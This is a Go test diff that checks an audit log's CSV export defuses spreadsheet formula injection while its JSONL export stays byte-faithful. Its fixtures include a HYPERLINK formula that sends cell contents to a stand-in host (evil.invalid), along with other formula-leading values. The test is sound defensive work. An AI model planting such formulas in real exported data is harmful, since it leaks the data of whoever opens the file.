@@ -195,3 +195,66 @@ func TestExportFilters(t *testing.T) {
 		t.Errorf("exported %d records, want the 4 in the model family", n)
 	}
 }
+
+// A spreadsheet strips the CSV quoting and then evaluates any cell that starts
+// with a formula character, so an exported justification runs when an auditor
+// opens the file. Quoting does not help; only the first character matters.
+func TestCSVNeutralisesFormulas(t *testing.T) {
+	db := openDB(t)
+	l := New(db, NewDelivery(nil, Warn, io.Discard), WithClock(fixedClock))
+
+	hostile := []string{
+		`=HYPERLINK("http://evil.invalid?"&A1,"click")`,
+		`+1+1`,
+		`-1+1`,
+		`@SUM(A1)`,
+		"\tleading tab",
+	}
+	for _, j := range hostile {
+		req := request("model.enable")
+		req.Justification = j
+		if _, err := l.Act(context.Background(), req, func(m Mutation) error { return nil }); err != nil {
+			t.Fatal(err)
+		}
+	}
+	// And one that must be left exactly as typed.
+	plain := request("model.enable")
+	plain.Justification = "ordinary reason, with a comma"
+	if _, err := l.Act(context.Background(), plain, func(m Mutation) error { return nil }); err != nil {
+		t.Fatal(err)
+	}
+
+	var out bytes.Buffer
+	if _, err := ExportCSV(context.Background(), db, Filter{}, &out); err != nil {
+		t.Fatal(err)
+	}
+	rows, err := csv.NewReader(bytes.NewReader(out.Bytes())).ReadAll()
+	if err != nil {
+		t.Fatal(err)
+	}
+	at := map[string]int{}
+	for i, name := range rows[0] {
+		at[name] = i
+	}
+	for i, want := range hostile {
+		got := rows[i+1][at["justification"]]
+		if got != "'"+want {
+			t.Errorf("justification %q exported as %q, want it defused", want, got)
+		}
+	}
+	if got := rows[len(hostile)+1][at["justification"]]; got != plain.Justification {
+		t.Errorf("an ordinary justification was altered: %q", got)
+	}
+
+	// The record itself, and the format a verifier reads, are untouched.
+	var jsonl bytes.Buffer
+	if _, err := ExportJSONL(context.Background(), db, Filter{}, &jsonl); err != nil {
+		t.Fatal(err)
+	}
+	if !bytes.Contains(jsonl.Bytes(), []byte(`=HYPERLINK`)) {
+		t.Error("the JSONL export altered the record; it is the byte-faithful one")
+	}
+	if bytes.Contains(jsonl.Bytes(), []byte(`'=HYPERLINK`)) {
+		t.Error("the CSV defence leaked into JSONL")
+	}
+}
